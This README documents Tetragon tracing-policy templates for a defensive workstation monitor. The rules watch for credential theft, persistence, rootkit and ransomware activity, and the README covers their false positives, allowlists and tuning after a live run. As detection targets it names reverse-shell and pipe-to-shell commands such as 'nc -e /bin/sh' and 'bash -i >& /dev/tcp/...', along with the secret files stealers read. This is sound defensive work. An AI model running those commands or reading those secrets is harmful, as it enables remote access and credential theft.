# policies/ — Tetragon TracingPolicy templates

49 `TracingPolicy` templates for Tetragon **v1.7.1** on Arch (kernel 7.1, BTF,
`lsm=...,bpf`). One file per rule, `policies/<family>-<rule>.yaml`, policy name
`moat-<family>-<rule>`. Everything here was written against
`docs/TETRAGON-NOTES.md`; where the notes say something is not expressible in a
policy it is **not faked here** — it is listed under [moatd covers](#moatd-covers).

This set has been through **one live run** and revised from the alerts it
produced; [what the first live run changed](#what-the-first-live-run-changed)
records every decision so nobody re-derives it from scratch.

Validate before packaging:

```
python3 policies/check.py          # structural check, exit 0 = good
```

`check.py` renders `{{HOME}}` to `/home/test`, parses every template, and
asserts the shape against the verified v1.7.1 grammar: `apiVersion`/`kind`,
name prefix and family, the required annotations, spec keys (`kprobes`,
`lsmhooks`, `tracepoints`, `uprobes`, `usdts`, `fentries`, `options`,
`enforcers`, `lists`, `loader`, `selectorsMacros`), the `matchArgs` operator
enum, the per-argument-type operator table, the `matchActions` action enum, the
`rateLimit` spelling and format, the value length caps (Prefix 256, Postfix 127,
SubString 100), the ≤5 selector / ≤5 matchArgs / ≤4 numeric value / ≤2 action
limits, that the `enforce` annotation agrees with the actions in the policy, and
that `tier` is one of the two words below.

## `moat.omarchy/tier`: detection or signal

Optional, `detection` by default. `signal` says **this rule is a building block,
not a conclusion** (BASELINE §4a): it is right about what it saw and weak about
what it means, so it is recorded in full, it is a full trigger for `chain.rs`,
and it never reaches the badge on its own. It does **not** change the severity —
chains need `>= medium` triggers and the baseline learns on severity — and it is
not a suppression.

Two things put a `signal` alert on the badge anyway: the §2b context matrix
escalating it to high/critical inside a `pkg-install` (a `/tmp` exec inside a
package install *is* a detection, which is the case these rules were written
for), and a chain that reached `high` re-stamping it.

Every `signal` policy carries a one-line comment above the annotation saying why
the rule is weak alone. A `signal` policy may not carry `enforce: kill|deny`:
a rule that has declared its evidence too weak for the badge must not be able to
end a process on it, and `check.py` rejects the combination.

The six shipped `signal` policies are `exec-untrusted-home`,
`exec-untrusted-tmpfs`, `net-first-contact`, `persist-desktop-entry-write`,
`persist-omarchy-plugin-write` and `persist-omarchy-menu-extension-write`; the
userland `moat-pkg-subtree-interpreter-spawn` declares the same tier in
`rules/pkg_subtree.rs`, and `moat-net-first-contact`'s userland half in
`rules/net_first_contact.rs`. That set is not a guess: it is precisely what the
noise guard's (now removed) rule-wide fan-out demotion had discovered on this
machine, once a day, through a circuit breaker that forgets.

## Policy table

FP column = what actually fires on a workstation doing Rust, Node and Docker
builds. Allowlist knob = the field to edit in the template (a rebuild of the
package, or a drop-in override in `/usr/lib/moat/policies`), plus the
userland escape hatch `moatctl ignore <id> --scope exe|exe+file|parent|rule`
which needs no policy change and no reload.

| Policy | Sev | Hook (kind) | Enforce | Expected false positives | Allowlist knob |
|---|---|---|---|---|---|
| `moat-cred-ssh-private-key-read` | high | `file_post_open` (lsm) | **Sigkill** | restic/borg backups, ansible, terraform, IDE git plugins, any Python/Go tool using an ssh library instead of `ssh` | `matchBinaries NotPostfix` (ssh suite, git, rsync) |
| `moat-cred-cloud-credentials-read` | high | `file_post_open` (lsm) | Post 60s | direnv/aws-vault wrappers, boto3 and other SDKs inside your own scripts, IDE cloud plugins | `matchBinaries NotPostfix` (the devops toolchain: aws, gcloud, az, kubectl, helm, k9s, terraform, tofu, pulumi, ansible, sam, minikube, kind, flyctl, wrangler, vercel, netlify, doctl, docker, podman) |
| `moat-cred-vcs-token-read` | high | `file_post_open` (lsm) | Post 60s | `curl --netrc` in a script, custom git credential helpers, JetBrains/VS Code git integrations | `matchBinaries NotPostfix` (git, gh, glab, helpers) |
| `moat-cred-registry-token-read` | medium | `file_post_open` (lsm) | Post 300s | **frequent**: every `npm install`, `pip install`, `cargo publish`, `docker pull` from a private registry | `matchBinaries NotPostfix` (node, bun, pip, uv, cargo, docker, plus the devops tools that log in to a container registry) |
| `moat-cred-ai-credentials-read` | high | `file_post_open` (lsm) | Post 60s | any node/bun process is allowlisted, so this mostly fires on shell/python one-liners; a non-node agent build will fire. Omarchy's own usage widgets are suppressed in-kernel | selector 0 `matchBinaries Prefix` (`/usr/share/omarchy/bin/omarchy-agent-usage-`) → `NoPost`; selector 1 `NotPostfix` (node, bun, the CLIs) |
| `moat-cred-gnupg-keyring-read` | high | `file_post_open` (lsm) | Post 60s | whole-home backups, `pass`-based scripts, git commit signing through a non-gpg wrapper | `matchBinaries NotPostfix` (gpg suite, keyring daemons) |
| `moat-cred-browser-secrets-read` | high | `file_post_open` (lsm) | Post 60s | backups; and any unrelated file whose basename is `Cookies`, `Local State` or `Web Data` (Postfix match, no directory anchor) | `matchBinaries NotPostfix` (browsers, password managers) |
| `moat-cred-etc-shadow-read` | critical | `file_post_open` (lsm) | **Sigkill** | a screen locker, display manager or PAM helper not in the list. `systemd-userwork`, `systemd-userdbd` and `sddm-helper` were added after the first live run (7 reads in 15 s from the user database service alone). **In enforce mode a miss here can break authentication** — keep this rule in monitor until you have seen a week of clean logs | `matchBinaries NotIn` (shadow-utils, PAM helpers, lockers, userdb) |
| `moat-persist-shell-rc-write` | high | `file_post_open` (lsm) | Post 60s | mise, rustup, nvm, conda, starship, atuin, oh-my-zsh installers | `matchBinaries NotPostfix` (editors) |
| `moat-persist-autostart-write` | high | `file_post_open` (lsm) | Post 60s | installing a user service on purpose (syncthing, mise), GNOME/KDE settings dialogs. `~/.local/share/applications/` moved out to its own rule | `matchBinaries NotPostfix` (editors, systemctl, flatpak) |
| `moat-persist-omarchy-hooks-write` | high | `file_post_open` (lsm) | Post 60s | writing a hook by hand; the hook scripts run on theme change, login and resume, which is why this is the high half of the split | selector 0 `matchBinaries Prefix` (omarchy) → `NoPost`, selector 1 `NotPostfix` (editors) |
| `moat-persist-hypr-config-write` | medium | `file_post_open` (lsm) | Post 60s | omarchy-shell saving settings, `hyprctl keyword`, theme switches; `/usr/bin/omarchy-*` and `/usr/share/omarchy/` are suppressed in-kernel | selector 0 `matchBinaries Prefix` → `NoPost`, selector 1 `NotPostfix` |
| `moat-persist-omarchy-plugin-write` | medium | `file_post_open` (lsm) | Post 60s | **was the single loudest rule of the first run**: `omarchy plugin add` is git, and git wrote 190 `.git/` internals under `~/.config/omarchy/plugins/.add.tmp.*`. `git` and `git-remote-http` are now allowlisted | selector 1 `NotPostfix` (editors, `/git`, `/git-remote-http`) |
| `moat-persist-desktop-entry-write` | medium | `file_post_open` (lsm) | Post 60s | **often**: web-app installers, Flatpak and pacman write `.desktop` files here; an `Exec=` hijack of a common launcher is the real risk | selector 1 `NotPostfix` (editors, pacman, flatpak, `/omarchy-refresh-applications`) |
| `moat-persist-omarchy-menu-extension-write` | low | `file_post_open` (lsm) | Post 60s | adding a menu entry by hand; the entry runs a command on click, which needs a click, hence low | selector 1 `NotPostfix` (editors) |
| `moat-persist-system-unit-write` | high | `file_post_open` (lsm) | Post 60s | `pacman -Syu` touching `/etc/systemd/system`, `sudo nvim /etc/sudoers.d/...`, `crontab -e` | `matchBinaries NotPostfix` (pacman, systemd, editors) |
| `moat-persist-authorized-keys-write` | critical | `file_post_open` (lsm) | **Sigkill** | `ssh-copy-id` (allowlisted), chezmoi/ansible managing your keys | `matchBinaries NotPostfix` |
| `moat-persist-git-hook-write` | high | `file_post_open` (lsm) | Post 60s | **frequent on Node repos**: husky, lefthook, pre-commit and direnv all write hooks during `npm install` | `matchBinaries NotPostfix`, or ignore `--scope exe+file` |
| `moat-persist-agent-config-write` | medium | `file_post_open` (lsm) | Post 300s | **frequent**: the agents rewrite `CLAUDE.md`, `settings.local.json` and `.mcp.json` themselves | `matchBinaries NotPostfix` (editors) |
| `moat-shell-reverse-shell-connect` | critical | `tcp_connect` (kprobe) | **Sigkill** | a script using `bash /dev/tcp` as a port check against a public host; `nc`/`socat` used deliberately. Private, loopback and link-local destinations never fire here — the private half is `moat-shell-lan-connect` | `matchBinaries Postfix` list; add CIDRs to `NotDAddr` |
| `moat-shell-lan-connect` | high | `tcp_connect` (kprobe) | Post 60s/process | the same shell/netcat list, but to 10/8, 172.16/12, 192.168/16 or `fc00::/7`. **Hand-run port checks are the whole FP surface**: `bash -c ": < /dev/tcp/192.168.1.1/80"` wait-loops, `nc -z` scans against a NAS, printer, router or container host, wait-for-it.sh in a Makefile. Never kills; loopback and link-local excluded | `matchBinaries Postfix` list; drop CIDRs from `DAddr` |
| `moat-rootkit-bpf-prog-load` | high | `bpf` (lsm) | Post 60s | **Docker**: containerd/runc load BPF on every container start; also bpftrace, bcc, `perf`, `tc` | `matchBinaries NotIn` |
| `moat-rootkit-kernel-module-load` | critical | `security_kernel_read_file` (kprobe) | **Sigkill** | dkms / NVIDIA / VirtualBox installs that insmod through a wrapper; matches both `READING_MODULE` (2) and `READING_MODULE_COMPRESSED` (7, Arch `.ko.zst`) | `matchBinaries NotIn` (kmod, systemd, dkms) |
| `moat-rootkit-ldso-preload-write` | critical | `file_post_open` (lsm) | **Sigkill** | none on a clean Arch desktop | `matchBinaries NotIn` |
| `moat-rootkit-bpffs-write` | medium | `file_post_open` (lsm) | Post 60s | container runtimes; note that `bpf(BPF_OBJ_PIN)` does not open a file, so real pinning shows up in the bpf-prog-load rule instead | `matchBinaries NotIn` |
| `moat-priv-setuid-chmod` | high | `path_chmod` (lsm) | Post 60s | `pacman` installing a setuid binary, `install -m 4755` inside a build, `sudo chmod u+s` by hand | `matchBinaries NotIn` (pacman, bsdtar, install) |
| `moat-priv-setcap-xattr` | high | `inode_setxattr` (lsm) | Post 60s | `sudo setcap` for a profiler or network tool (deliberately **not** allowlisted), pacman extracting capabilities | `matchBinaries NotIn` |
| `moat-priv-ptrace-attach` | high | `ptrace_access_check` (lsm) | Post 60s | debuggers not in the list (`bpftrace -p`, `py-spy`, `jstack`, JetBrains debug helpers), systemd-coredump | `matchBinaries NotIn` |
| `moat-priv-proc-mem-access` | medium | `proc_mem_open` (kprobe) | Post 60s | a profiler or crash reporter outside the debugger allowlist. Was `ptrace_access_check` + `Mask 1` and unusable — see below | `matchBinaries NotIn` (gdb, lldb, strace, perf, systemd-coredump) |
| `moat-exec-untrusted-tmpfs` | high | `bprm_check_security` (lsm) | Post 60s | **build systems**: autoconf `conftest`, cargo/go temporary binaries, makepkg building under `/tmp`, AppImage extraction, `curl \| sh` installers | `matchArgs Prefix` values; ignore `--scope exe` |
| `moat-exec-untrusted-home` | medium | `bprm_check_security` (lsm) | Post 300s | **frequent**: project worktrees (`node_modules/.bin`, `target/debug`, `.venv/bin`) and `~/.cache` (playwright, cypress, puppeteer, electron-builder). The version-manager and toolchain dirs are suppressed in-kernel | selector 0 `matchArgs Prefix` (toolchain) → `NoPost`, selector 1 `Prefix` values |
| `moat-net-suspicious-port-egress` | medium | `tcp_connect` (kprobe) | Post 60s | git-over-SSH (port 22), IRC/XMPP/game clients, a private registry or proxy on a custom port, dev servers calling a public API. Applies to every process now, so moatd raises it to high when the process is in a package-manager subtree | `DPort` value lists, `NotDAddr` CIDRs |
| `moat-net-tmpfs-binary-egress` | critical | `tcp_connect` (kprobe) | **Sigkill** | an installer you unpacked into `/tmp` and ran on purpose | `matchBinaries Prefix` values |

| `moat-rootkit-evidence-tamper` | critical | `security_path_unlink`, `security_path_truncate`, `security_path_rename` (kprobe) | Post 60s | none: only moatd, moatctl, moat-feeds and the sensor write in `/var/lib/moat` and `/var/log/moat`, and all four are excluded | `matchBinaries NotIn` (moat's own binaries) |
| `moat-rootkit-sensor-tamper` | critical | `security_file_post_open`, `security_path_unlink` (kprobe) | Post 60s | a package upgrade (pacman excluded), `moatctl` writing a learned silence, `sudo nvim /etc/moat/moat.toml` (editors excluded) | `matchBinaries NotPostfix`, `matchArgs Prefix` values |
| `moat-rootkit-trust-store-write` | high | `security_file_post_open` (kprobe) | Post 60s | `update-ca-trust`/`p11-kit` rebuilding the bundle, pacman, the network manager rewriting `/etc/hosts`, `sudo nvim /etc/hosts` | `matchBinaries NotPostfix` |
| `moat-rootkit-system-log-tamper` | high | `security_path_unlink`, `security_path_truncate` (kprobe) | Post 60s | `journalctl --vacuum-*` run as a disk clean-up, which is deliberately **not** excluded; journald's own deletions and logrotate are | `matchBinaries NotIn` |
| `moat-rootkit-history-tamper` | medium | `security_path_unlink`, `security_path_truncate` (kprobe) | Post 60s | you clearing your own history, a dotfile manager replacing it. The shells are excluded because a shell rewrites its own history on exit | `matchBinaries NotPostfix` |
| `moat-cred-project-token-read` | medium | `security_file_post_open` (kprobe) | Post 300s | **frequent**: every dev server, test run and framework start reads `.env`; scored down to the timeline in an interactive session and up inside an install (BASELINE 2b) | selector 0 `NotPostfix` (registry clients) for `.npmrc`; selector 1 `NotPostfix` (git, direnv, containers, editors, search/backup) for `.env` and `.git/config` |
| `moat-cred-ssh-recon-read` | medium | `security_file_post_open` (kprobe) | Post 300s | shell host-name completion (shells excluded), ansible, vagrant, `kitten ssh` | `matchBinaries NotPostfix` (the ssh suite, git, rsync, shells) |
| `moat-cred-ssh-agent-socket` | high | `security_socket_connect` (kprobe) | Post 60s | none seen; ssh, git, ssh-add and the password-manager agents are excluded. Only covers `/tmp/ssh-*` and `$HOME` sockets — see blind spots | `matchBinaries NotPostfix`, `matchArgs Prefix` values |
| `moat-priv-container-socket-connect` | high | `security_socket_connect` (kprobe) | Post 60s | testcontainers and other libraries that reach the socket through a language runtime rather than the `docker` CLI | `matchBinaries NotPostfix` (the container toolchain) |
| `moat-persist-git-config-write` | high | `security_file_post_open` (kprobe) | Post 60s | git itself on clone/`git config`/fetch (excluded), TUIs and editors | `matchBinaries NotPostfix` |
| `moat-ransom-snapshot-destroy` | critical | `security_path_unlink`, `security_path_rename`, `security_path_truncate` (kprobe) | Post 60s | you deleting a snapshot by hand under `/.snapshots`, `~/.snapshots`, `/timeshift`. snapperd, snapper's cleanup timer, timeshift, btrbk, yabsnap and btrfs-assistant are excluded. The subvolume itself dies through an ioctl this cannot see; the *commands* that do that are the userland rule `moat-ransom-snapshot-command` | `matchBinaries NotIn` (the snapshot tools) |
| `moat-ransom-file-churn` | low (**signal**, feeds a critical userland rule) | `security_file_post_open`, `security_path_unlink`, `security_path_rename`, `security_path_truncate` (kprobe) | **Post, no rateLimit** | never on its own while `[rules] ransom_file_churn` is on: moatd owns the id and counts the events instead of raising them. Scope is ~/Documents, ~/Desktop, ~/Pictures, ~/Videos, ~/Music, ~/Downloads only. The rule's FPs: a script moving photos across filesystems, batch in-place rewriters (jpegoptim, exiftool, prettier --write) on a document folder, renaming a folder of files to a new suffix by hand | `matchBinaries NotIn` (mv/rsync/tar, toolchains, sync and backup clients, thumbnailers, `file~` editors); `[thresholds] ransom_churn_*` |

Seven of these are `signal` rather than `detection` (see the tier section above):
`exec-untrusted-home`, `exec-untrusted-tmpfs`, `net-first-contact`,
`persist-desktop-entry-write`, `persist-omarchy-plugin-write`,
`persist-omarchy-menu-extension-write`, `ransom-file-churn`. They are recorded
and correlated on; they do not reach the badge alone. `ransom-file-churn` is the
odd one: like `net-first-contact` it is owned by the userland rule of the same
name, so moatd never records its individual events at all — they are input to a
counter, and the counter is the detection.

9 critical, 22 high, 12 medium, 3 low (46 **alerting** policies — 39 `detection`
tier and the 7 `signal` ones above), plus 3
`moat-telemetry-*` policies which are records rather than detections and are
rendered only when their class is on — see docs/SHIPPING.md. 4 policies carry
`Sigkill` and 3 carry `Override` (deny); 39 are report-only. Hook load: 27 programs on the `file_post_open` path (8 as
LSM hooks, 19 as kprobes on `security_file_post_open`), 6 on
`security_path_unlink`, 4 on `tcp_connect`, 5 on `security_path_truncate`, 3 on
`security_path_rename`, 2 on
`security_socket_connect`, 2 on `bprm_check_security`, and one each on
`socket_connect`, `ptrace_access_check`, `proc_mem_open`, `bpf`,
`path_chmod`, `inode_setxattr`, `security_kernel_read_file`. With every
telemetry class on that becomes 27 on the `file_post_open` path, 5 on
`tcp_connect` and 2 on `path_chmod`. Everything added
after the first live run is a **kprobe**: the 19-policy trampoline cap is per
LSM hook, and a kprobe is not attached through a trampoline. `python3 policies/check.py` prints this table from
the templates themselves; it is the source of truth if the two disagree.

## What the first live run changed

Monitor mode, one workstation, ordinary use. The alerts that arrived were
triaged and the decisions are all in the templates; this is the record.

* **`cred-etc-shadow-read`** — `systemd-userwork` read `/etc/shadow` seven times
  in fifteen seconds. Under enforce, that `Sigkill` would have killed the user
  database service and taken authentication with it. `systemd-userwork`,
  `systemd-userdbd` and `/usr/lib/sddm/sddm-helper` are now in the `NotIn`
  allowlist.
* **`cred-ai-credentials-read`** — Omarchy's own bar widgets read
  `~/.claude/.credentials.json` through
  `/usr/share/omarchy/bin/omarchy-agent-usage-claude` on every refresh. A
  `NoPost`-first selector on the `Prefix`
  `/usr/share/omarchy/bin/omarchy-agent-usage-` now suppresses them in-kernel.
* **`priv-proc-mem-access`** — the LSM `ptrace_access_check` hook with `Mask 1`
  (`PTRACE_MODE_READ`) fires on **every** `/proc/<pid>/stat` and
  `/proc/<pid>/cmdline` read: `pkill` alone produced 612 events, plus pipewire,
  journald, Hyprland and chrome. It is a process-listing hook, not a
  memory-reading hook. Replaced with a **kprobe on `proc_mem_open`**, which
  `fs/proc/base.c` calls from `mem_open`, `environ_open` and `auxv_open` — i.e.
  exactly `/proc/<pid>/{mem,environ,auxv}`, which is what a credential stealer
  reads and nothing else touches. Verified present as a global symbol on this
  kernel (`T proc_mem_open` in `/proc/kallsyms`; `mem_open`, `environ_open` and
  `auxv_open` are static `t`), prototype from vmlinux BTF
  `struct mm_struct *proc_mem_open(struct inode *, unsigned int mode)`.
  **If the kprobe fails to attach**, the narrower fallback is a kprobe on
  `mem_open` — `/proc/<pid>/mem` only, losing `environ` and `auxv`; being a
  static symbol it is in kallsyms but ftrace-availability could not be checked
  without root (notes section 6 flags this as UNVERIFIED). A second fallback is
  LSM `file_open` with `Prefix /proc/` + `Postfix /mem`, which needs two filters
  on one index (UNVERIFIED, notes section 2).
  `priv-ptrace-attach` was left alone: it already uses `Mask 2`
  (`PTRACE_MODE_ATTACH`) and was quiet.
* **`persist-desktop-config-write` was split into four and deleted.** It
  produced 191 alerts, 190 of them `git` writing `.git/` internals under
  `~/.config/omarchy/plugins/.add.tmp.*` during a single `omarchy plugin add`.
  One rule over all of `~/.config/omarchy/` could not be tuned, because the
  directory mixes code with churn. The four replacements each cover one thing
  that executes — `hypr/` (exec-once at every login, medium), `omarchy/hooks/`
  (scripts run on system events, high), `omarchy/plugins/` (QML/JS that runs
  inside the shell and hot-reloads, medium, with `git` allowlisted), and
  `omarchy/extensions/` (menu entries that run a command on click, low). The
  catch-all on `~/.config/omarchy/` was **dropped entirely**: `shell.json`,
  `themes/`, `backgrounds/` and `current/` change constantly and none of them
  executes code.
* **`persist-autostart-write`** — `~/.local/share/applications/` moved out into
  `persist-desktop-entry-write` at medium. An `Exec=` hijack of a launcher you
  use daily is real, but web-app installers, Flatpak and pacman write there
  often enough that it does not belong at high next to `~/.config/autostart/`
  and user units, which stay in `persist-autostart-write`.
* **The `pkg` family is gone**, and so is `ai-cli-in-pkg-subtree`.
  `matchParentBinaries` + `followChildren` produced matches on quickshell,
  Xwayland and `make` with no package manager anywhere in their ancestry, and
  npm/pnpm/yarn are node scripts, so the kernel only ever records the
  interpreter — the parent filter could not mean what the rule needed it to
  mean. moatd has the exact `exec_id` ancestry chain and the full argv, and does
  this in userland now (`moat-x-*`, contract section 6.4).
  `net-pkg-subtree-egress` became **`net-suspicious-port-egress`**: the parent
  filter is gone, the suspicious-port list and the RFC1918 `NotDAddr` exclusion
  stay, it applies to every process, and it drops to medium — moatd raises it to
  high when the connecting process is in a package-manager subtree.
* **No policy uses `matchParentBinaries` any more**, so
  `tetragon.conf.d/parents-map-enabled` is now `false`. The flag exists only to
  populate the `parents_map`, which nothing reads; leaving it on would cost a
  BPF map and a write per exec for nothing. Set it back to `true` the moment a
  policy grows a `matchParentBinaries` selector — Tetragon does not warn, the
  selector simply never matches.

### From the developer review (same pass)

* **`exec-untrusted-home`** — a developer runs binaries out of `$HOME` all day.
  The toolchain and version-manager directories (`~/.cargo/bin`, `~/.local/bin`,
  mise, pnpm, bun, `~/go/bin`, nvm, rustup, pyenv, rbenv, asdf, uv, JetBrains,
  VS Code extensions, `~/.local/share/omarchy`) are now excluded in-kernel by a
  `NoPost`-first selector. It has to be `NoPost` and not `NotPrefix`:
  `linux_binprm` accepts `Equal`/`NotEqual`/`Prefix`/`Postfix` only (notes
  section 2), there is no `NotPrefix` for that argument type. `~/.cache/`,
  `~/Downloads/`, `~/.config/` and the generic rest of `$HOME` still alert.
  Project worktrees (`node_modules/.bin`, `target/`, `.venv/bin`) sit anywhere
  under `$HOME` and cannot be excluded kernel-side, so they are the loudest
  remaining source here and moatd suppresses them by context.
* **Cloud, kube and container-registry credentials** — the devops tools that
  read those files by design are allowlisted in
  `cred-cloud-credentials-read` and `cred-registry-token-read`: terraform, tofu,
  pulumi, ansible, ansible-playbook, gcloud, az, sam, kubectl, helm, k9s,
  flyctl, wrangler, vercel, netlify, doctl, minikube and kind. Node- and
  python-based tools are **deliberately not** allowlisted on the cloud rule: a
  stealer is a node or python script, and allowlisting the interpreter would
  allowlist the attack.

## Monitor and enforce (verified, notes section 7)

* Every template carries `spec.options: [{name: policy-mode, value: monitor}]`,
  so a policy is **monitor** the moment it loads, whatever its `matchActions`
  say. Nothing here can kill until someone opts in.
* Precedence is `spec.options` < `tetra tp add --mode ...` < `tetra tp set-mode
  <name> monitor|enforce`. moatd calls `set-mode` for every `moat-*`
  policy at start and whenever `moatctl set mode` changes it. `set-mode`
  rewrites a pinned per-policy BPF array in place: it takes effect immediately,
  with no reload and no dropped events.
* Monitor mode **skips** `Sigkill`, `Signal`, `Override`, `NotifyEnforcer` and
  `Set`. `Post`, `NoPost`, `TrackSock`, `GetUrl` and `DnsLookup` still run.
* The event still reports `"action":"KPROBE_ACTION_SIGKILL"` in monitor mode —
  the action field is the configured action, not the taken one. **A kill is
  only proven by the matching `process_exit` with `"signal":"SIGKILL"` for that
  `exec_id`**, which is what moatd must use before writing
  `action_taken: killed`.
* `Post` and `Sigkill` are never combined in one selector here: a `Sigkill`
  selector still emits its event, and combining them would spend both of the
  two actions BPF allows per selector.

## The `{{HOME}}` rendering rule

Tetragon has `Prefix` / `Postfix` / `Equal` only — no globs, no regex, no
middle wildcard, and `SubString` is refused for `file` and `path` arguments. So
`/home/*/.ssh/id_rsa` cannot be written as a filter.

Templates therefore contain the literal token `{{HOME}}`, always inside a
quoted YAML scalar, always as a **whole leading path component**
(`"{{HOME}}/.ssh/id_rsa"`, `"{{HOME}}/.config/autostart/"`). No other
placeholder exists; `check.py` fails on any other `{{...}}`.

`moatd render-policies` (the `ExecStartPre` of `tetragon.service`):

1. reads `/etc/passwd`, selects users with `uid >= 1000` whose home is under
   `/home` or `/var/home`;
2. for each template in `/usr/lib/moat/policies/*.yaml`, expands `{{HOME}}`
   into **one value per home** inside every `values:` list — a template value
   becomes N values, the policy name and everything else stay identical;
3. writes the result to `/run/moat/policies/` (`tracing-policy-dir`);
4. regenerates `/etc/tetragon/tetragon.conf.d/export-allowlist` with the exact
   policy names (see `export-allowlist.example`).

Values are map-backed for `Equal`/`Prefix`/`Postfix` on strings and paths, so
expanding one value into one-per-user costs nothing and hits no 4-value cap.
Keep the caps in mind when a home is long: Prefix values must stay ≤256 bytes,
Postfix ≤127.

Tetragon reads `--tracing-policy-dir` **once at startup** and has no hot
reload, so rendering must happen before the daemon starts, and a new user needs
`systemctl restart tetragon` (or `tetra tp add`).

## Daemon configuration

`tetragon.conf.d/` is one file per flag, Tetragon's own convention, installed to
`/etc/tetragon/tetragon.conf.d/`. Empty file = flag disabled.

| File | Value | Why |
|---|---|---|
| `bpf-lib` | `/usr/lib/tetragon/bpf` | upstream CO-RE objects |
| `tracing-policy-dir` | `/run/moat/policies` | rendered templates |
| `parents-map-enabled` | `false` | **was `true`.** No template uses `matchParentBinaries` any more (the `pkg` family and the parent filter on the net rule were removed after the first live run), so the `parents_map` would be populated on every exec and read by nobody. Flip it back to `true` before adding any `matchParentBinaries` selector: Tetragon does not warn, the selector just never matches |
| `export-filename` | `/var/log/moat/tetragon.log` | moatd tails this; gRPC is not used in v1 |
| `export-file-max-size-mb` | `50` | |
| `export-file-max-backups` | `3` | |
| `export-file-compress` | `false` | keep rotated files readable for triage |
| `server-address` | `unix:///run/tetragon/tetragon.sock` | root-only, used by `tetra tp set-mode` |
| `metrics-server` | *(empty)* | disabled |
| `gops-address` | *(empty)* | disabled |
| `health-server-address` | *(empty)* | **listens on :6789 by default**, disabled here |
| `log-format` | `json` | |
| `log-level` | `info` | |
| `event-queue-size` | `32768` | notes section 10: builds spawn thousands of execs |
| `process-cache-size` | `131072` | keeps ancestry resolvable under load |
| `cgroup-rate` | `1000,1s` | per-cgroup base-event throttle; emits `process_throttle`. Remove it if you would rather lose no exec events than throttle a runaway build |
| `enable-process-environment-variables` | `true` | + the next line, this is the only way to see `LD_PRELOAD` |
| `filter-environment-variables` | `LD_PRELOAD` | capture nothing else — unfiltered env capture is expensive and leaks secrets into the log |

Not shipped, on purpose:

* `export-allowlist` — generated by `moatd render-policies`; see
  `export-allowlist.example` for the exact two JSON lines it must write
  (`PROCESS_EXEC`+`PROCESS_EXIT`, then the exact `policy_names` list; Tetragon
  matches policy names exactly, there is no prefix match).
* `enable-ancestors` — moatd builds the ancestry chain itself from
  `process_exec`/`process_exit` (contract section 6.2), which is cheaper.
* `disable-kprobe-multi` — add it only if kprobe attachment fails on a kernel
  without `kprobe_multi`.

`tetragon.service` is the upstream unit with FHS paths, `RuntimeDirectory=tetragon`,
`ExecStartPre=/usr/bin/moatd render-policies`, and sandboxing that keeps BPF
working. Do not add `ProtectKernelTunables=yes` (remounts `/sys` read-only and
breaks bpffs) or `PrivateMounts`/`PrivateUsers` (break process and path
visibility).

## Design decisions worth knowing

* **Reads and writes go through LSM `file_post_open`**, not
  `security_file_permission`. `file_post_open` fires once per open and gets
  `acc_mode`: `Mask ["4"]` is a read-open (`O_RDONLY`=4, `O_RDWR`=6),
  `Mask ["2"]` is a write-open (`O_WRONLY`=2, `O_RDWR`=6, plus `O_TRUNC`).
  `security_file_permission` fires on **every** `read()`/`write()` and resolves
  `d_path` each time — unusable on a build machine (notes section 10).
* **No two filters share one `matchArgs` index** on a path or string argument:
  the notes flag `Prefix` + `Postfix` on the same index as UNVERIFIED at
  runtime, so the templates use either an exact `Equal` list (possible because
  `{{HOME}}` is rendered) or a single `Prefix`/`Postfix` list. Several filters
  on one `sock` argument *is* the verified upstream shape and is used in the
  net policies.
* **`matchBinaries` uses `NotPostfix` for allowlists of interpreters and
  editors** (`/node`, `/nvim`) because version managers put them at
  unpredictable absolute paths, and `NotIn` for stable system binaries. The
  trade-off: a payload at `/tmp/x/bin/node` is allowlisted by a `/node`
  postfix. Rules whose allowlist must not be forgeable (`etc-shadow`,
  `kernel-module-load`, `bpf-prog-load`, `ldso-preload`) use exact `NotIn`.
* **Allowlist ordering trick**: where a rule needs two different
  `matchBinaries` operators (only one entry is allowed per selector), selector 0
  matches the allowlisted binaries and ends in `NoPost`, and selector 1 does the
  detection — selectors are ORed and the first match wins. Used by all four
  `persist-omarchy-*`/`persist-hypr-config-write` rules,
  `persist-desktop-entry-write` and `cred-ai-credentials-read`. The same trick
  substitutes for a missing operator: `exec-untrusted-home` needs "not under
  these prefixes" on a `linux_binprm` argument, which has no `NotPrefix`, so
  selector 0 matches the toolchain prefixes and ends in `NoPost`.
* **Scripts resolve to their interpreter.** `matchBinaries` sees
  `/usr/bin/node`, not `/usr/bin/npm`; `/usr/bin/bash`, not `/usr/bin/makepkg`.
  This is what killed the package-manager-subtree rules on the first live run —
  a parent list of `npm`/`pnpm`/`yarn` can never match, because the parent the
  kernel recorded is `node`. Allowlists that must catch a package manager are
  written as interpreter postfixes; everything that needs the real front-end is
  moatd's, from argv.

## moatd covers

Not expressible in a v1.7.1 policy. The policies emit the underlying event; the
decision is moatd's (contract section 6.4, rule ids `moat-x-*`).

1. **Process arguments.** No selector can look at argv. That means
   `nc -e /bin/sh`, `socat ... EXEC:`, `bash -i >& /dev/tcp/...`,
   `curl ... | sh`, and the AI permission-skipping flags
   (`--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`,
   `--full-auto`) are all matched in userland against
   `process_exec.process.arguments`. The shell/reverse-shell family is written
   to detect the *behaviour* instead (a shell opening a public TCP socket), so
   it does not depend on flags.
2. **Ancestry, all of it.** `matchParentBinaries` + `followChildren` covers a
   subtree only when the root binary is at an exact absolute path.
   Version-managed interpreters (`~/.local/share/mise/installs/node/*/bin/node`,
   nvm, asdf, pyenv, uv-managed pythons) and script front-ends whose recorded
   binary is the interpreter (`makepkg` → bash, `npm` → node) are **not**
   matched in-kernel. The first live run settled it: the parent filter matched
   quickshell, Xwayland and `make` — processes with no package manager anywhere
   above them — while missing the npm subtree it was written for. **The whole
   `pkg` family and `ai-cli-in-pkg-subtree` were therefore deleted**, and
   `net-suspicious-port-egress` no longer filters on a parent. moatd owns every
   ancestry question now, from its `exec_id` chain: "is this in a
   package-manager subtree" (which also decides when to raise
   `net-suspicious-port-egress` from medium to high), "did a package install
   spawn an interpreter, a downloader or netcat", and "does this AI CLI have an
   interactive shell in its chain" (`moat-x-ai-cli-headless`). It has the argv
   too, which the kernel never does.
   Project worktrees are the same problem one level down: `node_modules/.bin`,
   `target/debug` and `.venv/bin` can sit anywhere under `$HOME`, so
   `exec-untrusted-home` cannot exclude them with a `Prefix` and moatd
   suppresses them by context.
3. **Middle-wildcard paths.** Browser profile directories
   (`~/.mozilla/firefox/<random>/`) are matched by basename `Postfix` only, so
   any file called `Cookies` matches; private SSH keys with non-standard names
   are not matched at all (only the `id_*` set is). Post-filter and extend in
   userland.
